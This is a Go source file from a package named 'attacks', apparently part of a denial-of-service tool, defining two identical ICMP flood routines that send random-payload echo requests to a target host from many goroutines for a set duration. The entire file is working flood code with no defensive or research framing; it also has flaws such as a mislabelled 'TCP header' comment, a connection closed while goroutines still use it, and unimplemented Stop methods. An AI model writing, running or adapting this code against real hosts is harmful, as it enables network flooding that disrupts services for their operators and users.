package attacks

import (
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"log"
	"math/rand"
	"net"
	"time"
)

type Icmp struct{}

func (i Icmp) Name() string {
	return "icmp"
}

func (i Icmp) Send(host string, port int, seconds int, size int, threads int) {
	conn := getProtoConn("icmp")
	for i := 0; i < threads; i++ {
		go func() {
			payload := make([]byte, size)
			rand.Read(payload)
			netIp := net.ParseIP(host)
			endAt := time.Now().Add(time.Second * time.Duration(seconds))
			// Our TCP header
			icmp := &layers.ICMPv4{
				TypeCode: layers.ICMPv4TypeEchoRequest,
			}
			buf := gopacket.NewSerializeBuffer()
			opts := gopacket.SerializeOptions{
				ComputeChecksums: true,
				FixLengths:       true,
			}
			if err := gopacket.SerializeLayers(buf, opts, icmp, gopacket.Payload(payload)); err != nil {
				log.Fatal(err)
			}
			bytes := buf.Bytes()
			for time.Now().Before(endAt) {
				conn.WriteTo(bytes, &net.IPAddr{IP: netIp})
			}
		}()
	}
	conn.Close()
}

func (i Icmp) Stop(host string, port int) {
	//TODO implement me
	panic("implement me")
}

type L struct{}

func (i L) Name() string {
	return "l"
}

func (i L) Send(host string, port int, seconds int, size int, threads int) {
	conn := getProtoConn("icmp")
	for i := 0; i < threads; i++ {
		go func() {
			payload := make([]byte, size)
			rand.Read(payload)
			netIp := net.ParseIP(host)
			endAt := time.Now().Add(time.Second * time.Duration(seconds))
			// Our TCP header
			icmp := &layers.ICMPv4{
				TypeCode: layers.ICMPv4TypeEchoRequest,
			}
			buf := gopacket.NewSerializeBuffer()
			opts := gopacket.SerializeOptions{
				ComputeChecksums: true,
				FixLengths:       true,
			}
			if err := gopacket.SerializeLayers(buf, opts, icmp, gopacket.Payload(payload)); err != nil {
				log.Fatal(err)
			}
			bytes := buf.Bytes()
			for time.Now().Before(endAt) {
				conn.WriteTo(bytes, &net.IPAddr{IP: netIp})
			}
		}()
	}
	conn.Close()
}

func (i L) Stop(host string, port int) {
	//TODO implement me
	panic("implement me")
}
